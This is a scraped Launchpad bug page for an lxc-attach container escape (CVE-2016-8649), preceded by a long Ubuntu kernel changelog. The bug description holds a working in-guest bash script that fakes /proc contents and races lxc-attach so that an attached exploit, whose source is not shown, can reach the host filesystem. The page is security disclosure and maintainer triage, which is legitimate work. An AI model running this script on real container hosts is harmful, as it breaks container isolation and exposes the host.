- staging: ks7010: fix wait\_for\_completion\_interruptible\_timeout return
handling
- staging: ks7010: declare private functions static
- IB/hfi1: Move iowait\_init() to priv allocate
- IB/rdmavt: Correct sparse annotation
- IB/qib: Remove qpt\_mask global
- IB/mlx5: Fix steering resource leak
- power: bq24257: Fix use of uninitialized pointer bq->charger
- dmaengine: ipu: remove bogus NO\_IRQ reference
- mm/hugetlb: check for reserved hugepages during memory offline
- mm/hugetlb: improve locking in dissolve\_free\_huge\_pages()
- drm/vmwgfx: Avoid validating views on view destruction
- s390/cio: fix accidental interrupt enabling during resume
- s390/con3270: fix use of uninitialised data
- s390/con3270: fix insufficient space padding
- clk: bcm2835: Skip PLLC clocks when deciding on a new clock parent
- clk: gcc-msm8996: Fix pcie 2 pipe register offset
- clk: qcom: select GDSC for msm8996 gcc and mmcc
- clk: qoriq: fix a register offset error
- clk: Return errors from clk providers in \_\_of\_clk\_get\_from\_provider()
- clk: core: Force setting the phase delay when no change
- clk: divider: Fix clk\_divider\_round\_rate() to use clk\_readl()
- perf data: Fix building in 32 bit platform with libbabeltrace
- perf hists browser: Fix event group display
- perf powerpc: Fix build-test failure
- perf ui/tui: Reset output width for hierarchy
- perf ui/stdio: Always reset output width for hierarchy
- perf symbols: Check symbol\_conf.allow\_aliases for kallsyms loading too
- perf symbols: Fixup symbol sizes before picking best ones
- iwlwifi: check for valid ethernet address provided by OEM
- iwlwifi: mvm: fix pending frames tracking on tx resp
- iwlwifi: mvm: call a different txq\_enable function
- iwlwifi: mvm: free reserved queue on STA removal
- iwlwifi: mvm: support BAR in reorder buffer
- iwlwifi: mvm: disable P2P queue on mac context release
- iwlwifi: mvm: bail out if CTDP start operation fails
- ARM: dts: sun9i: Add missing #interrupt-cells to R\_PIO pinctrl device node
- pinctrl: qcom: fix masking of pinmux functions
- mpt3sas: Don't spam logs if logging level is 0
- powerpc: Always restore FPU/VEC/VSX if hardware transactional memory in use
- powerpc: Add check\_if\_tm\_restore\_required() to giveup\_all()
- powerpc/nvram: Fix an incorrect partition merge
- powerpc: Fix usage of \_PAGE\_RO in hugepage
- ARM: pxa: pxa\_cplds: fix interrupt handling
- ARM: pxa: fix GPIO double shifts
- ARM: dts: NSP: Correct RAM amount for BCM958625HR board
- ARM: dts: fix RealView EB SMSC ethernet version
- ARM: dts: omap3: overo: add missing unit name for lcd35 display
- PCI: rcar: Fix pci\_remap\_iospace() failure path
- PCI: aardvark: Fix pci\_remap\_iospace() failure path
- PCI: generic: Fix pci\_remap\_iospace() failure path
- PCI: versatile: Fix pci\_remap\_iospace() failure path
- PCI: designware: Fix pci\_remap\_iospace() failure path
- PCI: tegra: Fix pci\_remap\_iospace() failure path
- libnvdimm: clear the internal poison\_list when clearing badblocks
- Linux 4.8.6
\* Yakkety update to v4.8.5 stable release (LP: #1637520)
- gpio: mpc8xxx: Correct irq handler function
- mei: fix return value on disconnection
- mei: me: add kaby point device ids
- regulator: tps65910: Work around silicon erratum SWCZ010
- clk: imx6: initialize GPU clocks
- clk: imx6: fix i.MX6DL clock tree to reflect reality
- spi: spidev\_test: Fix buffer overflow in unescape()
- PM / devfreq: event: remove duplicate devfreq\_event\_get\_drvdata()
- ath10k: fix copy engine 5 destination ring stuck
- rtlwifi: Fix missing country code for Great Britain
- mmc: block: don't use CMD23 with very old MMC cards
- mmc: sdhci: cast unsigned int to unsigned long long to avoid unexpeted error
- PCI: Mark Atheros AR9580 to avoid bus reset
- PCI: tegra: Fix argument order in tegra\_pcie\_phy\_disable()
- platform: don't return 0 from platform\_get\_irq[\_byname]() on error
- cpufreq: ti: Use generic platdev driver
- cpufreq: conservative: Fix next frequency selection
- cpufreq: skip invalid entries when searching the frequency
- cpufreq: intel\_pstate: Fix unsafe HWP MSR access
- cpufreq: fix overflow in cpufreq\_table\_find\_index\_dl()
- parisc: Increase KERNEL\_INITIAL\_SIZE for 32-bit SMP kernels
- parisc: Fix self-detected CPU stall warnings on Mako machines
- parisc: Fix kernel memory layout regarding position of \_\_gp
- parisc: Increase initial kernel mapping size
- pstore/ramoops: fixup driver removal
- pstore/core: drop cmpxchg based updates
- pstore/ram: Use memcpy\_toio instead of memcpy
- pstore/ram: Use memcpy\_fromio() to save old buffer
- perf intel-pt: Fix snapshot overlap detection decoder errors
- perf intel-pt: Fix estimated timestamps for cycle-accurate mode
- perf intel-pt: Fix MTC timestamp calculation for large MTC periods
- dm: mark request\_queue dead before destroying the DM device
- dm: return correct error code in dm\_resume()'s retry loop
- dm rq: take request\_queue lock while clearing QUEUE\_FLAG\_STOPPED
- dm mpath: check if path's request\_queue is dying in activate\_path()
- dm crypt: fix crash on exit
- powerpc/xmon: Don't use ld on 32-bit
- powerpc/vdso64: Use double word compare on pointers
- powerpc/powernv: Pass CPU-endian PE number to opal\_pci\_eeh\_freeze\_clear()
- powerpc/eeh: Null check uses of eeh\_pe\_bus\_get
- powerpc/powernv: Use CPU-endian hub diag-data type in
pnv\_eeh\_get\_and\_dump\_hub\_diag()
- powerpc/powernv: Use CPU-endian PEST in pnv\_pci\_dump\_p7ioc\_diag\_data()
- powerpc/mm: Update FORCE\_MAX\_ZONEORDER range to allow hugetlb w/4K
- powerpc/mm/hash64: Fix might\_have\_hea() check
- IB/srp: Fix infinite loop when FMR sg[0].offset != 0
- IB/core: correctly handle rdma\_rw\_init\_mrs() failure
- ubi: Deal with interrupted erasures in WL
- zfcp: fix fc\_host port\_type with NPIV
- zfcp: fix ELS/GS request&response length for hardware data router
- zfcp: close window with unblocked rport during rport gone
- zfcp: retain trace level for SCSI and HBA FSF response records
- zfcp: restore: Dont use 0 to indicate invalid LUN in rec trace
- zfcp: trace on request for open and close of WKA port
- zfcp: restore tracing of handle for port and LUN with HBA records
- zfcp: fix D\_ID field with actual value on tracing SAN responses
- zfcp: fix payload trace length for SAN request&response
- zfcp: trace full payload of all SAN records (req,resp,iels)
- scsi: zfcp: spin\_lock\_irqsave() is not nestable
- fbdev/efifb: Fix 16 color palette entry calculation
- ovl: Fix info leak in ovl\_lookup\_temp()
- ovl: copy\_up\_xattr(): use strnlen
- mb86a20s: fix the locking logic
- mb86a20s: fix demod settings
- cx231xx: don't return error on success
- cx231xx: fix GPIOs for Pixelview SBTVD hybrid
- cx231xx: can't proceed if I2C bus register fails
- ALSA: hda - Fix a failure of micmute led when having multi adcs
- MIPS: Fix -mabi=64 build of vdso.lds
- MIPS: ptrace: Fix regs\_return\_value for kernel context
- Input: i8042 - skip selftest on ASUS laptops
- Input: elantech - force needed quirks on Fujitsu H760
- Input: elantech - add Fujitsu Lifebook E556 to force crc\_enabled
- sunrpc: fix write space race causing stalls
- NFSD: fix corruption in notifier registration
- NFS: Fix inode corruption in nfs\_prime\_dcache()
- NFSv4: Don't report revoked delegations as valid in nfs\_have\_delegation()
- NFSv4: nfs4\_copy\_delegation\_stateid() must fail if the delegation is invalid
- NFSv4: Open state recovery must account for file permission changes
- NFSv4.2: Fix a reference leak in nfs42\_proc\_layoutstats\_generic
- pnfs/blocklayout: fix last\_write\_offset incorrectly set to page boundary
- scsi: Fix use-after-free
- watchdog: rt2880\_wdt: Remove assignment of dev pointer
- watchdog: mt7621\_wdt: Remove assignment of dev pointer
- metag: Only define atomic\_dec\_if\_positive conditionally
- soc/fsl/qe: fix gpio save\_regs functions
- soc/fsl/qe: fix Oops on CPM1 (and likely CPM2)
- arm64: KVM: VHE: reset PSTATE.PAN on entry to EL2
- arc: don't leak bits of kernel stack into coredump
- fs/super.c: fix race between freeze\_super() and thaw\_super()
- cifs: Limit the overall credit acquired
- fs/cifs: keep guid when assigning fid to fileinfo
- Clarify locking of cifs file and tcon structures and make more granular
- Display number of credits available
- Set previous session id correctly on SMB3 reconnect
- SMB3: GUIDs should be constructed as random but valid uuids
- Do not send SMB3 SET\_INFO request if nothing is changing
- Cleanup missing frees on some ioctls
- blkcg: Unlock blkcg\_pol\_mutex only once when cpd == NULL
- x86/e820: Don't merge consecutive E820\_PRAM ranges
- kvm: x86: memset whole irq\_eoi
- x86/platform/UV: Fix support for EFI\_OLD\_MEMMAP after BIOS callback updates
- x86/boot/smp: Don't try to poke disabled/non-existent APIC
- pinctrl: intel: Only restore pins that are used by the driver
- pinctrl: baytrail: Fix lockdep
- sched/fair: Fix incorrect task group ->load\_avg
- sched/fair: Fix min\_vruntime tracking
- irqchip/gicv3: Handle loop timeout proper
- irqchip/eznps: Acknowledge NPS\_IPI before calling the handler
- irqchip/gic-v3-its: Fix entry size mask for GITS\_BASER
- cxl: Prevent adapter reset if an active context exists
- isofs: Do not return EACCES for unknown filesystems
- memstick: rtsx\_usb\_ms: Runtime resume the device when polling for cards
- memstick: rtsx\_usb\_ms: Manage runtime PM when accessing the device
- arm64: swp emulation: bound LL/SC retries before rescheduling
- arm64: kaslr: fix breakage with CONFIG\_MODVERSIONS=y
- arm64: percpu: rewrite ll/sc loops in assembly
- arm64: kernel: Init MDCR\_EL2 even in the absence of a PMU
- arm64: Cortex-A53 errata workaround: check for kernel addresses
- arm64: KVM: Take S1 walks into account when determining S2 write faults
- ceph: fix error handling in ceph\_read\_iter
- powerpc/mm: Prevent unlikely crash in copro\_calculate\_slb()
- mmc: core: Annotate cmd\_hdr as \_\_le32
- mmc: core: switch to 1V8 or 1V2 for hs400es mode
- mmc: rtsx\_usb\_sdmmc: Avoid keeping the device runtime resumed when unused
- mmc: rtsx\_usb\_sdmmc: Handle runtime PM while changing the led
- KVM: s390: reject invalid modes for runtime instrumentation
- fscrypto: make XTS tweak initialization endian-independent
- fscrypto: lock inode while setting encryption policy
- ext4: do not advertise encryption support when disabled
- jbd2: fix incorrect unlock on j\_list\_lock
- ubifs: Fix xattr\_names length in exit paths
- target/tcm\_fc: use CPU affinity for responses
- target: Re-add missing SCF\_ACK\_KREF assignment in v4.1.y
- target: Make EXTENDED\_COPY 0xe4 failure return COPY TARGET DEVICE NOT
REACHABLE
- target: Don't override EXTENDED\_COPY xcopy\_pt\_cmd SCSI status code
- Revert "target: Fix residual overflow handling in
target\_complete\_cmd\_with\_length"
- Linux 4.8.5
\* Yakkety update to v4.8.4 stable release (LP: #1637517)
- serial: imx: Fix DCD reading
- BUG: atmel\_serial: Interrupts not disabled on close
- serial: 8250\_dw: Check the data->pclk when get apb\_pclk
- serial: 8250\_port: fix runtime PM use in \_\_do\_stop\_tx\_rs485()
- ARCv2: intc: Use kflag if STATUS32.IE must be reset
- ARCv2: fix local\_save\_flags
- debugfs: introduce a public file\_operations accessor
- b43: fix debugfs crash
- b43legacy: fix debugfs crash
- carl9170: fix debugfs crashes
- Btrfs: fix free space tree bitmaps on big-endian systems
- Btrfs: fix mount -o clear\_cache,space\_cache=v2
- Btrfs: catch invalid free space trees
- btrfs: assign error values to the correct bio structs
- mei: amthif: fix deadlock in initialization during a reset
- drivers: base: dma-mapping: page align the size when unmap\_kernel\_range
- IB/hfi1: Fix defered ack race with qp destroy
- clk: mvebu: fix setting unwanted flags in CP110 gate clock
- clk: mvebu: dynamically allocate resources in Armada CP110 system controller
- fuse: listxattr: verify xattr list
- fuse: invalidate dir dentry after chmod
- fuse: fix killing s[ug]id in setattr
- mm: filemap: fix mapping->nrpages double accounting in fuse
- i40e: avoid NULL pointer dereference and recursive errors on early PCI error
- xfs: change mailing list address
- mm: filemap: don't plant shadow entries without radix tree node
- brcmfmac: fix pmksa->bssid usage
- brcmfmac: fix memory leak in brcmf\_fill\_bss\_param
- brcmfmac: use correct skb freeing helper when deleting flowring
- ASoC: nau8825: fix bug in FLL parameter
- ASoC: Intel: Atom: add a missing star in a memcpy call
- reiserfs: Unlock superblock before calling reiserfs\_quota\_on\_mount()
- async\_pq\_val: fix DMA memory leak
- scsi: arcmsr: Simplify user\_len checking
- ipc/sem.c: fix complex\_count vs. simple op race
- mm/hugetlb: fix memory offline with hugepage size > memory block size
- vfs,mm: fix a dead loop in truncate\_inode\_pages\_range()
- jbd2: fix lockdep annotation in add\_transaction\_credits()
- ext4: enforce online defrag restriction for encrypted files
- ext4: reinforce check of i\_dtime when clearing high fields of uid and gid
- ext4: bugfix for mmaped pages in mpage\_release\_unused\_pages()
- ext4: fix memory leak in ext4\_insert\_range()
- ext4: fix memory leak when symlink decryption fails
- ext4: allow DAX writeback for hole punch
- ext4: release bh in make\_indexed\_dir
- ext4: unmap metadata when zeroing blocks
- dlm: free workqueues after the connections
- vfs: move permission checking into notify\_change() for utimes(NULL)
- cachefiles: Fix attempt to read i\_blocks after deleting file [ver #2]
- drm: virtio: reinstate drm\_virtio\_set\_busid()
- acpi, nfit: check for the correct event code in notifications
- cfq: fix starvation of asynchronous writes
- Linux 4.8.4
\* Yakkety update to v4.8.3 stable release (LP: #1637512)
- v4l: rcar-fcp: Don't force users to check for disabled FCP support
- scsi: configure runtime pm before calling device\_add in
scsi\_add\_host\_with\_dma
- Make \_\_xfs\_xattr\_put\_listen preperly report errors.
- Linux 4.8.3
\* KVM: PPC: Book3S HV: Migrate pinned pages out of CMA (LP: #1632045)
- KVM: PPC: Book3S HV: Migrate pinned pages out of CMA
\* unexpectedly large memory usage of mounted snaps (LP: #1636847)
- [Config] switch squashfs to single threaded decode
\* Fix bugs under virtual scsi server driver for Power (LP: #1621088)
- target/user: Use sense\_reason\_t in tcmu\_queue\_cmd\_ring
- target/user: Return an error if cmd data size is too large
- target/user: Fix comments to not refer to data ring
\* ISST-LTE:pVM nvme 0000:a0:00.0: iommu\_alloc failed on NVMe card
(LP: #1633128)
- dma-mapping: introduce the DMA\_ATTR\_NO\_WARN attribute
- powerpc: implement the DMA\_ATTR\_NO\_WARN attribute
- nvme: use the DMA\_ATTR\_NO\_WARN attribute
\* arm64: kprobes disabled (LP: #1634271)
- [Config] Enable KPROBES on arm64
\* Bad page state in process genwqe\_gunzip pfn:3c275 in the genwqe device
driver (LP: #1559194)
- SAUCE: (noup) Bad page state in process genwqe\_gunzip pfn:3c275 in the
genwqe device driver
\* CVE-2016-7425
- scsi: arcmsr: Buffer overflow in arcmsr\_iop\_message\_xfer()
\* Add ipvlan module to 16.04 kernel (LP: #1634705)
- [Config] Add ipvlan to the generic inclusion list
\* hio Ubuntu sauce driver needs porting to 4.8 (LP: #1635594)
- SAUCE: import Huawei ES3000\_V2 (2.1.0.23)
- SAUCE: hio: bio\_endio() no longer takes errors arg
- SAUCE: hio: blk\_queue make\_request\_fn now returns a blk\_qc\_t
- SAUCE: hio: use alloc\_cpumask\_var to avoid -Wframe-larger-than
- SAUCE: hio: fix mask maybe-uninitialized warning
- SAUCE: hio: port to v4.8 base
- [config] enable CONFIG\_HIO (Huawei ES3000\_V2 PCIe SSD driver)
- SAUCE: hio: Makefile and Kconfig
- [Config] Enforce CONFIG\_HIO
\* Yakkety update to v4.8.2 stable release (LP: #1633973)
- usb: storage: fix runtime pm issue in usb\_stor\_probe2
- timekeeping: Fix \_\_ktime\_get\_fast\_ns() regression
- usb: dwc3: fix Clear Stall EP command failure
- phy: sun4i-usb: Use spinlock to guard phyctl register access
- ALSA: ali5451: Fix out-of-bound position reporting
- ALSA: usb-audio: Extend DragonFly dB scale quirk to cover other variants
- ALSA: usb-line6: use the same declaration as definition in header for MIDI
manufacturer ID
- mfd: rtsx\_usb: Avoid setting ucr->current\_sg.status
- mfd: atmel-hlcdc: Do not sleep in atomic context
- mfd: 88pm80x: Double shifting bug in suspend/resume
- mfd: wm8350-i2c: Make sure the i2c regmap functions are compiled
- xen/x86: Update topology map for PV VCPUs
- KVM: PPC: Book3s PR: Allow access to unprivileged MMCR2 register
- KVM: MIPS: Drop other CPU ASIDs on guest MMU changes
- KVM: arm64: Require in-kernel irqchip for PMU support
- KVM: arm/arm64: vgic: Don't flush/sync without a working vgic
- KVM: PPC: BookE: Fix a sanity check
- arm64: fix dump\_backtrace/unwind\_frame with NULL tsk
- x86/boot: Fix kdump, cleanup aborted E820\_PRAM max\_pfn manipulation
- x86/irq: Prevent force migration of irqs which are not in the vector domain
- x86/pkeys: Make protection keys an "eager" feature
- x86/cpu: Rename Merrifield2 to Moorefield
- x86/platform/intel-mid: Add Intel Penwell to ID table
- x86/platform/intel-mid: Keep SRAM powered on at boot
- x86/apic: Get rid of apic\_version[] array
- arch/x86: Handle non enumerated CPU after physical hotplug
- x86/mm/pkeys: Do not skip PKRU register if debug registers are not used
- x86/dumpstack: Fix x86\_32 kernel\_stack\_pointer() previous stack access
- ARM: fix delays
- ARM: dts: mvebu: armada-390: add missing compatibility string and bracket
- ARM: dts: MSM8064 remove flags from SPMI/MPP IRQs
- ARM: dts: MSM8660 remove flags from SPMI/MPP IRQs
- ARM: cpuidle: Fix error return code
- Bluetooth: Add a new 04ca:3011 QCA\_ROME device
- ima: use file\_dentry()
- tpm: fix a race condition in tpm2\_unseal\_trusted()
- tpm\_crb: fix crb\_req\_canceled behavior
- Linux 4.8.2
\* Bluetooth 04ca:3011 [Asus Aspire V3-371] doesn't work (LP: #1535802)
- Bluetooth: Add a new 04ca:3011 QCA\_ROME device
-- Luis Henriques <luis.henriques@canonical.com> Fri, 11 Nov 2016 10:30:54 +0000

| Changed in linux (Ubuntu Yakkety): | |
| --- | --- |
| **status**: | Fix Committed → Fix Released |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Launchpad Janitor (janitor)](https://launchpad.net/~janitor) wrote on 2016-12-06: |  |  | [#66](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/66) |
| --- | --- | --- | --- |

This bug was fixed in the package linux - 4.8.0-30.32

---------------

linux (4.8.0-30.32) yakkety; urgency=low

\* CVE-2016-8655 (LP: [#1646318](/bugs/1646318))

    - packet: fix race condition in packet\_set\_ring

-- Brad Figg <email address hidden> Thu, 01 Dec 2016 08:02:53 -0800

This bug was fixed in the package linux - 4.8.0-30.32
---------------
linux (4.8.0-30.32) yakkety; urgency=low
\* CVE-2016-8655 (LP: #1646318)
- packet: fix race condition in packet\_set\_ring
-- Brad Figg <brad.figg@canonical.com> Thu, 01 Dec 2016 08:02:53 -0800

| Changed in linux (Ubuntu): | |
| --- | --- |
| **status**: | Triaged → Fix Released |

[See full activity log](https://bugs.launchpad.net/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Bactivity)

To post a comment you must [log in](%2Blogin?comments=all).

* [Report a bug](/ubuntu/%2Bsource/lxc/%2Bfilebug)

This report contains
**Public Security**
information

Everyone can see this security related information.

You are
[not directly subscribed to this bug's notifications.](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Bsubscribe)

Subscribing...

* [Edit bug mail](https://bugs.launchpad.net/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Bsubscriptions "View and change your subscriptions to this bug")

## Other bug subscribers

[Subscribe someone else](https://bugs.launchpad.net/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Baddsubscriber "Launchpad will email that person whenever this bugs changes")

## Patches

* [0001-attach-prevent-stealing-proc-fd-by-container.patch](https://bugs.launchpad.net/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Battachment/4774507/%2Bfiles/0001-attach-prevent-stealing-proc-fd-by-container.patch)
  [Edit](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Battachment/4774507 "Change patch details")
* [attach: do not send procfd to attached process](https://bugs.launchpad.net/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Battachment/4774931/%2Bfiles/0001-attach-do-not-send-procfd-to-attached-process.patch)
  [Edit](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Battachment/4774931 "Change patch details")
* [0001-attach-do-not-send-procfd-to-attached-process.patch](https://bugs.launchpad.net/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Battachment/4777815/%2Bfiles/0001-attach-do-not-send-procfd-to-attached-process.patch)
  [Edit](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Battachment/4777815 "Change patch details")
* [LXC patch for master.](https://bugs.launchpad.net/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Battachment/4779383/%2Bfiles/0001-attach-do-not-send-procfd-to-attached-process.patch)
  [Edit](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Battachment/4779383 "Change patch details")
* [LXC patch for stable-2.0.](https://bugs.launchpad.net/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Battachment/4779384/%2Bfiles/0001-attach-do-not-send-procfd-to-attached-process_stable-2.0.patch)
  [Edit](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Battachment/4779384 "Change patch details")
* [LXC patch for stable-1.0.](https://bugs.launchpad.net/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Battachment/4779385/%2Bfiles/0001-attach-do-not-send-procfd-to-attached-process_stable-1.0.patch)
  [Edit](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Battachment/4779385 "Change patch details")

* [Add patch](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Baddcomment?field.patch=on)

## Bug attachments

* [LxcAttachEscape.c](https://bugs.launchpad.net/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Battachment/4772615/%2Bfiles/LxcAttachEscape.c)
  [Edit](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Battachment/4772615 "Change attachment details")

* [Add attachment](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Baddcomment)

## Remote bug watches

Bug watches keep track of this bug in other bug trackers.

[![Launchpad](/@@/launchpad-footer-logo.svg)](https://launchpad.net/)
 •
[Take the tour](https://launchpad.net/%2Btour)
 •
[Read the guide](https://help.launchpad.net/)

© 2004
[Canonical Ltd.](http://canonical.com/)
 •
[Terms of use](https://launchpad.net/legal)
 •
[Data privacy](https://www.ubuntu.com/legal/dataprivacy)
 •
[Contact Launchpad Support](/feedback)
 •
[Blog](http://blog.launchpad.net/)
 •
[Careers](https://canonical.com/careers)
 •
[System status](https://ubuntu.social/%40launchpadstatus)
 •
50c26bf
([Get the code!](https://dev.launchpad.net/))



=== Content from launchpad.net_35188bd8_20250126_010323.html ===

[Log in / Register](https://bugs.launchpad.net/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Blogin)

[![](https://launchpadlibrarian.net/606381979/CoF%2064px.png)](https://launchpad.net/ubuntu)

## [Ubuntu](https://launchpad.net/ubuntu)[lxc package](https://launchpad.net/ubuntu/%2Bsource/lxc)

* [Overview](https://launchpad.net/ubuntu/%2Bsource/lxc)
* [Code](https://code.launchpad.net/ubuntu/%2Bsource/lxc)
* [Bugs](https://bugs.launchpad.net/ubuntu/%2Bsource/lxc)
* Blueprints
* [Translations](https://translations.launchpad.net/ubuntu/%2Bsource/lxc)
* [Answers](https://answers.launchpad.net/ubuntu/%2Bsource/lxc)

# lxc-attach to malicious container allows access to host

Bug #1639345 reported by
[Roman Fiedler](https://launchpad.net/~roman-fiedler-deactivatedaccount)
on 2016-11-04

[266](/%2Bhelp-bugs/bug-heat.html)

This bug affects 1 person

| Affects | | Status | Importance | Assigned to | Milestone |
| --- | --- | --- | --- | --- | --- |
|  | [linux (Ubuntu)](https://bugs.launchpad.net/ubuntu/%2Bsource/linux "Latest release: 6.12.0-12.12, uploaded to main on 2025-01-22 14:57:10.708421+00:00 by Paolo Pisati (p-pisati), maintained by Ubuntu Kernel Team (kernel-team)") | Fix Released | Undecided | Unassigned |  |
|  | [Trusty](https://bugs.launchpad.net/ubuntu/trusty/%2Bsource/linux) | Fix Released | Undecided | Unassigned |  |
|  | [Vivid](https://bugs.launchpad.net/ubuntu/vivid/%2Bsource/linux) | Fix Released | Undecided | Unassigned |  |
|  | [Xenial](https://bugs.launchpad.net/ubuntu/xenial/%2Bsource/linux) | Fix Released | Undecided | Unassigned |  |
|  | [Yakkety](https://bugs.launchpad.net/ubuntu/yakkety/%2Bsource/linux) | Fix Released | Undecided | Unassigned |  |
|  | [lxc (Ubuntu)](https://bugs.launchpad.net/ubuntu/%2Bsource/lxc "Latest release: 1:6.0.3-1, uploaded to main on 2024-12-20 04:41:45.351873+00:00 by pkg-lxc (pkg-lxc-devel), maintained by pkg-lxc (pkg-lxc-devel)") | Fix Released | Critical | [Christian Brauner](https://launchpad.net/~cbrauner) |  |
|  | [Trusty](https://bugs.launchpad.net/ubuntu/trusty/%2Bsource/lxc) | Fix Released | Undecided | Unassigned |  |
|  | [Vivid](https://bugs.launchpad.net/ubuntu/vivid/%2Bsource/lxc) | Fix Released | Undecided | Unassigned |  |
|  | [Xenial](https://bugs.launchpad.net/ubuntu/xenial/%2Bsource/lxc) | Fix Released | Undecided | Unassigned |  |
|  | [Yakkety](https://bugs.launchpad.net/ubuntu/yakkety/%2Bsource/lxc) | Fix Released | Undecided | Unassigned |  |

### Bug Description

A malicious root user in an unprivileged container may interfere with lxc-attach to provide manipulated guest proc file system information to disable dropping of capabilities and may in the end access the host file system by winning a very easy race against lxc-attach.

In guest sequence:

cat <<EOF > /tmp/test

#!/bin/bash -e

rm -rf /test || true

mkdir -p /test/sys/kernel

echo "proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0" > /test/mounts

echo 0 > /test/sys/kernel/cap\_last\_cap

mkdir -p /test/self

mknod /test/self/status p

cd /proc

mount -o bind /test /proc

while true; do

  pid=\$(ls -al \*/exe | grep lxc-attach | sed -r -e 's/.\* ([0-9]+)\\/exe ->.\*/\\1/')

  if [ "\${pid}" != "" ]; then

    cd /

    umount -i -f -l -n /proc

    exec /LxcAttachEscape "\${pid}" /bin/bash

  fi

  sleep 1

done

EOF

See attachment for LxcAttachEscape.c

Exploit uses fixed fd=7 for attacking, on other test environment, it might be other fd. Tests were performed by attacking lxc-attach started by

screen lxc-attach -n [guestname]

which is the sequence required against the TTY-stealing attacks also not fixed in all lxc-attach versions.

In my opinion two bugs might need fixing:

\* lxc-attach should not use untrusted/manipulated information for proceeding

\* kernel should prevent against ptracing of lxc-attach as it was created in another USERNS

# lsb\_release -r -d

Description: Ubuntu 16.04.1 LTS

Release: 16.04

# apt-cache policy lxc1

lxc1:

  Installed: 2.0.5-0ubuntu1~ubuntu16.04.2

  Candidate: 2.0.5-0ubuntu1~ubuntu16.04.2

  Version table:

 \*\*\* 2.0.5-0ubuntu1~ubuntu16.04.2 500

        500 <http://debarchive-ehealth.d03.arc.local/ubuntu> xenial-updates/main amd64 Packages

        100 /var/lib/dpkg/status

     2.0.0-0ubuntu2 500

        500 <http://debarchive-ehealth.d03.arc.local/ubuntu> xenial/main amd64 Packages

Tags:

[bot-stop-nagging](/ubuntu/%2Bsource/lxc/%2Bbugs?field.tag=bot-stop-nagging)
[kernel-da-key](/ubuntu/%2Bsource/lxc/%2Bbugs?field.tag=kernel-da-key)
[verification-done-trusty](/ubuntu/%2Bsource/lxc/%2Bbugs?field.tag=verification-done-trusty)
[verification-done-vivid](/ubuntu/%2Bsource/lxc/%2Bbugs?field.tag=verification-done-vivid)
[verification-done-xenial](/ubuntu/%2Bsource/lxc/%2Bbugs?field.tag=verification-done-xenial)
[verification-done-yakkety](/ubuntu/%2Bsource/lxc/%2Bbugs?field.tag=verification-done-yakkety)

## CVE References

* [2016-7425](/bugs/cve/2016-7425 "The arcmsr_iop_message_xfer function ...")
* [2016-8649](/bugs/cve/2016-8649 "lxc-attach in LXC before 1.0.9 and 2....")
* [2016-8655](/bugs/cve/2016-8655 "Race condition in net/packet/af_packe...")
* [2016-8658](/bugs/cve/2016-8658 "Stack-based buffer overflow in the br...")

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Roman Fiedler (roman-fiedler-deactivatedaccount)](https://launchpad.net/~roman-fiedler-deactivatedaccount) wrote on 2016-11-04: |  |  | [#1](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/1) |
| --- | --- | --- | --- |

* [LxcAttachEscape.c](https://bugs.launchpad.net/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Battachment/4772615/%2Bfiles/LxcAttachEscape.c)
  [Edit](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Battachment/4772615)
  (2.0 KiB,
  text/x-csrc)

Exploit code for stealing of fixed fd=7 directory fd still held open by lxc-attach when entering the guest namespace.

Exploit code for stealing of fixed fd=7 directory fd still held open by lxc-attach when entering the guest namespace.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tyler Hicks (tyhicks)](https://launchpad.net/~tyhicks) wrote on 2016-11-04: |  |  | [#2](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/2) |
| --- | --- | --- | --- |

Thanks for the report, Roman. I've subscribed the LXC maintainers so that they can have a look and comment.

Thanks for the report, Roman. I've subscribed the LXC maintainers so that they can have a look and comment.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Stéphane Graber (stgraber)](https://launchpad.net/~stgraber) wrote on 2016-11-04: |  |  | [#3](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/3) |
| --- | --- | --- | --- |

Thanks for the report.

As you mentioned LXC 2.0 is now using an intermediate PTS pair to avoid attacks against the host TTY. We're also meant to be using our own copy of proc during attach, but apparently have missed a couple of places.

It's certainly our goal that lxc-attach shouldn't rely on any information coming from inside the container as that can be indeed modified by the user to attack a root process attaching to the container.

Thanks for the report.
As you mentioned LXC 2.0 is now using an intermediate PTS pair to avoid attacks against the host TTY. We're also meant to be using our own copy of proc during attach, but apparently have missed a couple of places.
It's certainly our goal that lxc-attach shouldn't rely on any information coming from inside the container as that can be indeed modified by the user to attack a root process attaching to the container.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Stéphane Graber (stgraber)](https://launchpad.net/~stgraber) wrote on 2016-11-04: |  |  | [#4](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/comments/4) |
| --- | --- | --- | --- |

